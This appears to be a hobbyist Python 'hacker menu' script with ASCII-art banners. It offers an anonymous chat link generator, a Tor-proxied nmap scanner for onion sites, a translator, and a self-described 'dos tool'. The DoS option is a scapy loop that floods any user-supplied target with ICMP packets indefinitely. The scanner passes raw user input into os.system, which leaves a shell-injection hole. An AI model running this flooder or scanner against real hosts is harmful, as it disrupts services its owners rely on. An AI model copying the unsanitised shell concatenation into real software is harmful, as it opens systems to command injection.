import os, time, socket, random
import os
import subprocess
from scapy.all import *
import goslate

gs = goslate.Goslate()

def menu():
 try:
      skull = input('''             .,ad88888ba,.
           .,ad8888888888888a,
          d8P"""98888P"""98888b,
          9b    d8888,    `9888B
        ,d88aaa8888888b,,,d888P'
       d8888888888888888888888b
      d888888P""98888888888888P
      88888P'    9888888888888
      `98P'       9888888888P'
                   `"9888P"'
                      `"' 
  1.) anonymous chat

  2.) onion site scanner

  3.) shitty dos tool

  4.) translate tool

  ''' + GREEN + '''  option > ''' + CYAN)
      if skull == '1':
          os.system('clear')
          chat()
      elif skull == '2':
          os.system('clear')
          torscan()
      elif skull == '3':
          os.system('clear')
          dos()
      elif skull == '4':
          os.system('clear')
          translate()
 except:
          os.system('clear')
          print('something went wrong :(')
          return

def translate():
    print ('''████████╗██████╗  █████╗ ███╗   ██╗███████╗██╗      █████╗ ████████╗███████╗
╚══██╔══╝██╔══██╗██╔══██╗████╗  ██║██╔════╝██║     ██╔══██╗╚══██╔══╝██╔════╝
   ██║   ██████╔╝███████║██╔██╗ ██║███████╗██║     ███████║   ██║   █████╗  
   ██║   ██╔══██╗██╔══██║██║╚██╗██║╚════██║██║     ██╔══██║   ██║   ██╔══╝  
   ██║   ██║  ██║██║  ██║██║ ╚████║███████║███████╗██║  ██║   ██║   ███████╗
   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝
                                                                            
''')
    text = input('text: ')
    translatedText = gs.translate(text,'en')
    print(translatedText)
    return

def torscan():
    print ('''                            ~
                           /~
                     \  \ /**
                      \ ////
                      // //
                     // //
                   ///&//
                  / & /\ \
                /  & .,,  \
              /& %  :       \
            /&  %   :  ;     `\
           /&' &..%   !..    `.\
          /&' : &''" !  ``. : `.\
         /#' % :  "" * .   : : `.\
        I# :& :  !"  *  `.  : ::  I
        I &% : : !%.` '. . : : :  I
        I && :%: .&.   . . : :  : I
        I %&&&%%: WW. .%. : :     I
         \&&&##%%%`W! & '  :   ,'/
          \####ITO%% W &..'  #,'/
            \W&&##%%&&&&### %./
              \###j[\##//##}/
                 ++///~~\//_
                  \\ \ \ \  \_
                  /  /    \   

''')
    target = input('onion site: ')
    os.system('service tor start')
    os.system('clear')
    print ('this may take a while...')
    time.sleep(3.5)
    try:
        os.system('proxychains4 nmap -Pn -sT -v ' + target)
    except:
        os.system('clear')
        print('somthing went wrong:(')
        return

def chat():
   print (''' ▄████████    ▄█    █▄       ▄████████     ███     
███    ███   ███    ███     ███    ███ ▀█████████▄ 
███    █▀    ███    ███     ███    ███    ▀███▀▀██ 
███         ▄███▄▄▄▄███▄▄   ███    ███     ███   ▀ 
███        ▀▀███▀▀▀▀███▀  ▀███████████     ███     
███    █▄    ███    ███     ███    ███     ███     
███    ███   ███    ███     ███    ███     ███     
████████▀    ███    █▀      ███    █▀     ▄████▀   
                                                   
''')
   WORDS = ("python", "jumble", "easy", "difficult", "answer",  "xylophone")
   word = random.choice(WORDS)
   correct = word
   jumble = ""
   while word:
       position = random.randrange(len(word))
       jumble += word[position]
       word = word[:position] + word[(position + 1):]
   print ('https://hack.chat/?' + jumble)
   print ("copy the link above and go to it on you're browser")
   print ("send the link to someone to talk to them anonymously...")
   return
def dos():
    print ('''
 _(`-')               (`-').-> 
( (OO ).->     .->    ( OO)_   
 \    .'_ (`-')----. (_)--\_)  
 '`'-..__)( OO).-.  '/    _ /  
 |  |  ' |( _) | |  |\_..`--.  
 |  |  / : \|  |)|  |.-._)   \ 
 |  '-'  /  '  '-'  '\       / 
 `------'    `-----'  `-----'  

''')
    target = input('target: ')
    bytes = int(input('bytes: '))
    try:
        while True:
            send(IP(dst=target)/ICMP()/"HelloWorld", count=bytes)
    except:
        os.system('clear')
        print ('unknown target or error')
        return

RED =  '\033[31m'
ENDC = '\033[m'
GREEN = '\033[32m'
CYAN = '\033[36m'

def clear():
    os.system('clear')
    return
clear()
logo = '''                                                                                      . :S%%S;;S;%%%SSStXS;%@8StX; ..                                                                                    
                                                                                   .:XXXX%t88%@;XXSX@8t@XX@XX%@888t;..                                                                                  
                                                                                .;8SSStXXX%XXS8SX8@XXXt@@%S@XX@Xt@%88XX.                                                                                
                                                                              ..@tXX@S@X@@X8SS8tX@SS@S:8@%8X8%@S%@%X%%8X;..                                                                             
                                                                             .%XtX@tX@XXXXSX8%8SX8S%8X%X@SSSXSXS88%@SSSX8S:..                                                                           
                                                                          .:S;tSX@S%XS@SXX@X8XS%XXSSS@:XStSS@%8SSStSXXSXS:@X;.                                                                          
                                                                          .8@XX@S8X%8@SXSXS8XS8XSX@XXS;8XX8X@S8@XS%SXXSXX%8@8..                                                                         
                                                                        .:8XX@SSS8St@S%X@SSX%tXSSSSXXX%X8SXS@S@%%8SSSS8S8@8@S8;.                                                                        
                                                                       .:8:SSSXSX8@%X@SXSXX8@%8X@8@88X:S8%8X@%8XS@S@XSS88;8X%88;..                                                                      
                                                                      . 8:t8%X888@XtX@@8S@S88;@SXS@XS8X88XS@X@Xt%XSXS@XSS%8SS8X@%                                                                       
                                                                     ..8SX%@;XXSS@S:8XXSSXX@XSXtSSXX8@%XXXXS@t@SSX%XSS%@X;8StX8XS:.                                                                     
                                                                    ..:S8SX8S@8@S8XtXXSS@8XXS%8SSXXSSX;X@@8X@SXS%SSXS@88X%@@SXS@@@..                                                                    
                                                                    . %88SS8SXSSS8S:@XtSXSt@X%8%SXSt8@tXXSS@@tXX%8%XSSSS8X@S%S8SSX..                                                                    
                                                                     ;X@X%%XSSSXS@S%@XSS@XS8t%8S@XX@@S%XXXXX@%@t@8SXSX8X@tX@%X@@%8%.                                                                    
                                                                    .:XS8@%@S88XS8S;8@%8X@8@8@8SXSXXS8SS8@8X@S888SSSX@XS@XS@SSS@S%8.                                                                    
                                                                    .;@SX8X8SSXXS8X%@XSXX@S88X8SSX@@88;8@SSX@%SSS8tSXXSS8;8@%@X@;88.                                                                    
                                                                    .;X@S8XStS%SX8S;X@%SSSXXt%8SSSXXS@%8@t@SXS8SS@@S%SSXS:XS%SXXX88.                                                                    
                                                                    .;8S88%8SXXSSX@@88XSXX%88S8SXS@X8@%X@SXXSXS%S8@88%S8SSXX%XXXS8X:                                                                    
                                                                    ..XS88%S%XSS8t:.   ;@8XS8%@%XXXS8S;XS%XX8SXXt:.::.t8X;@S%8X@S@:                                                                     
                                                                    ...S8SSSSX%X8:.    .    8%8X@8SS8Xt@@S88  .:.... . XSt@X%@@S88..                                                                    
                                                                     . XtS%XtS%8t:.        ..;X8XXSS@X:88%;    ..      %8SSX@XXS%t.                                                                     
                                                                      .:8:%@S@@8:.          ..:t8SSXSX;Xt:..          .%8%@XXSXX...                                                                     
                                                                      . 8;SSS@X%8........ ....%S@XXX8X:;tX.....:....:..X%XS@%S8;.                                                                       
                                                                       ..@;8S@8XX88@XXtSSXS%@%8@8SSX8@t@St8@%X%Xt%SX%8SXSt8XSX8  .                                                                      
                                                                       ..8%@%8XXX8X;t%:tt%X@X%8X@8@@8X;@X%SX%;X%.%t%@SS8Xt@@X88..                                                                       
                                                                        t@SXSX8@S@8tX%%8@X%S@SX%S8XS88X@X@@@8%X8@8%XXXSSStX8SXX:.                                                                       
                                                                       .8SXS%8SXX8X;XSX%S@SXStXXS@X88 S%SSX%S@XSS@XX%SSXXt@SSSX@.                                                                       
                                                                       .%S%8SS888@X;@X@S@Xt8XSSS%:8XXt::8%S8@X88S8%X@8@X@tXS%88;.                                                                       
                                                                       ..@:XSS@SSXXtXSSS@XtX%%@%%.8t8:.:8t@X8S8SSS%@XXS@@X@XSS8 .                                                                       
                                                                       ..S8888888@X;XSS@XXS@8%8%XXXS88:88SSSXX@ttStSSS@8@8888@t..                                                                       
                                                                           ..... %S@@%SXS@%8@%8SXSXSS@t8XSXS8%XXX8%SS@;::.::....                                                                        
                                                                                .t%%XSXXSXXSS%8%@@SS8X:SXtS%@SX;XXSX;X;::                                                                               
                                                                              X8%tXtX8888SXS%%X%@X@88@t8@%XX8S@888X@%S;X88.                                                                             
                                                                             .8:@..t@88.;X%8@tS%@XXS8X;SX8S8@%@8.S@@t;8S@S: .                                                                           
                                                                              8t8t.:  ..:%SX%%8t 8X@X8t: @%@8t@t.  .::@X@%.                                                                             
                                                                              8XX8S;.   :::. . ...      ..   :...  :;@X@@8.                                                                             
                                                                              8S@88%S%%:.:..  .              ....;@88@8SXS.                                                                             
                                                                              8SS8@%Xt8 t@88@tt:.;%;%SS. :%S@8@X.8SSX@X@@X                                                                              
                                                                              t88SXS@%8S8S%@S:S:.@%%X@t;.8;S@XX8X8@@@@%8X@                                                                              
                                                                             ...:tS@@@;S@XSX@;SX8SSSXXt@8SSXXS@Xt@SX88%%;.                                                                              
                                                                                ....%88X@@S88%8tXX@X@@;88S8X8S@@X88@: ::.                                                                               
                                                                                   ..:.%88tS%t8SS%SSX@t@@%XSSS88S:::  .                                                                                 
                                                                                     . ...t88S8X@XSS8@%X8@S@tX;:. .                                                                                     
                                                                                       . ... .:t8@S@S8888;::.. ..                                                                                       
                                                                                          .   :::..;:::;::..                                                                                            
                                                                                               .   .....                                                                                                
                                                                                            .     ..... .     ... .  .                                                                                  
                              .   . ........ ............           . .....................................:::....:::..::::::::.................       ''' + GREEN + '''      ..    .   .                                
                             ''' + ENDC + ''';@t. :..;;:t@;..                                ...       .......... .   .............. ..................                   ''' + GREEN + ''' ..;888888:..@:.8S;8;88.                      
                            ''' + ENDC + '''S888@.:.8;Xt%%%:                                                                                                                ''' + GREEN + ''';%XXXS%@X 8 8;SX:t888                       
                            ''' + ENDC + '''.%8%. t8;:;;:SS.                                                                                                              ''' + GREEN + ''' . .tXX8X;.  ..;:: :..                        
                             ''' + ENDC + '''..............                                                                                                                 ''' + GREEN + ''' ....::.   ..... .                          
                                  ''' + ENDC + '''.  ..                                                                                                                       ''' + GREEN + '''. . .                                     
                                                                                                                                                                                                        
                                            ''' + RED + '''                           :;;;;;;:.         .:;;;;;;..:;;;;;;..:;;;::;;;;..:;;;;;;:.                                                              
                                                                    8 . :8.. Xt:t8@XX@SS:8 .     @S@X@X@X8:XS@@X@@:.t;8X@  SX@.S ;8XX@XXX                                                               
                                                                 .. @ . .X . S; X888888 .S ..  . 8 ........X..... X ;@ ...S . @;.S888888:.                                                              
                                                                 .. SttS8 :;S t :;t%%%tt; ;::;;:@@8::::::;:@ .:;;t  %X.. t8 . 8X..;;t%%%8                                                               
                                                                  .:t;t%XS;tSS::t%tttt@;:XtSt%%Xt:SSXSt8SX::X;%S%S@...   .    ..:X;t%%%%t..                                                             
                                                                  ..::;:..::::..:::;::....:.:::...;t8::t%8t .:;:::..        . . ..:::::::.                                                              
                                                                 ..:::::::.:... ....:::::::::....:.tt:8%@S@.;::;;::::::::::::::::::;;::::..                                                             
                                                                 .;t%SSS%St;;:::.:;tt%SSSS%%%:....:%S%%tt;SttSSSSSSX%%SSSSSSSSSS%%SSSSS%%;..                                                            
                                                                 .;%%SXXSXt88%%%%SS@8X8888@@St:.::%@SSSSSSXSX8@88888X88SXS88%XX8@@88888@X%:.                                                            
                                                                 ..;;t8%tt;8@888888S8S@88888@;:.::%8t%%t%%88@888888@@88%%t88t%%8@@X888888%:..                                                           
                                                                  ..::8;:;:XX:t:;tt88@88888@X;.:::t8@@@8@@888S;;;;;%88@;;:SX:t;S88888888@%:..                                                           
                                                                    ..::...:::....::;;;t;;;:;:.....:;:;::;::;:::..:::::....:...:::;;;;;:;::..                                                           
                                                                    . ....... ......:::.:........ ........................... .......:.:...                                                             
'''

print (logo)
time.sleep(4)
clear()
menu()
